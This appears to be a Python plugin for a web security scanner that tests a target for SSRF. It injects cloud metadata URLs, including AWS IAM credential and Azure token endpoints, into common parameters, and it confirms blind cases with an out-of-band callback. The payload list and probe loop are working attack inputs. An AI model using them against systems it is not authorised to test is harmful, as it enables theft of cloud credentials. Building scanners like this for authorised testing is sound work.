
from dataclasses import dataclass, field
from typing import Dict, Any, List
import aiohttp

CAPS={"passive": False, "active": True, "requires_auth": False, "oast": True, "dangerous": False}

@dataclass
class Finding:
    title: str
    description: str
    severity: str
    evidence: Dict[str, Any] = field(default_factory=dict)
    plugin: str = "ssrf_cloud_metadata"

PARAMS=["url","redirect","next","src","file","u"]
# Common cloud metadata endpoints
CLOUD_URLS=[
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/metadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://169.254.169.254/metadata/identity/oauth2/token",
    "http://100.100.100.200/latest/meta-data/",
]

try:
    from utils.oast_client import OASTClient as _OAST
except Exception:
    _OAST=None

class Plugin:
    def __init__(self, target: str, session: aiohttp.ClientSession, config: dict):
        self.target=target.rstrip("/")
        self.session=session
        self.config=config
        self.oast = config.get("oast_client") or (_OAST() if _OAST else None)

    async def run(self)->List[Finding]:
        out: List[Finding] = []
        # (A) Opportunistic reflective SSRF: if app fetches and reflects content
        keywords=["instance-id","ami-id","meta-data","project-id","Metadata-Flavor"]
        for p in PARAMS:
            for cu in CLOUD_URLS:
                sep="&" if "?" in self.target else "?"
                url=f"{self.target}{sep}{p}={cu}"
                try:
                    async with self.session.get(url) as r:
                        txt = await r.text()
                        if any(k in txt for k in keywords):
                            out.append(Finding("Cloud Metadata SSRF (reflected)", "Response suggests metadata content was fetched", "Critical",
                                               {"url": url, "snippet": txt[:200]}))
                            return out
                except Exception:
                    continue

        # (B) OAST-assisted beacon (server-side DNS/HTTP proof)
        if not self.oast:
            return out
        payload = self.oast.get_payload()  # e.g., https://<id>.oast.pro
        for p in PARAMS:
            sep="&" if "?" in self.target else "?"
            url=f"{self.target}{sep}{p}={payload}"
            try:
                await self.session.get(url)
            except Exception:
                pass
        try:
            if await self.oast.check_interactions():
                out.append(Finding("SSRF Confirmed (OAST)", "Target made OAST callback; try metadata pivot safely", "High",
                                   {"oast_payload": payload}))
        except Exception:
            pass
        return out
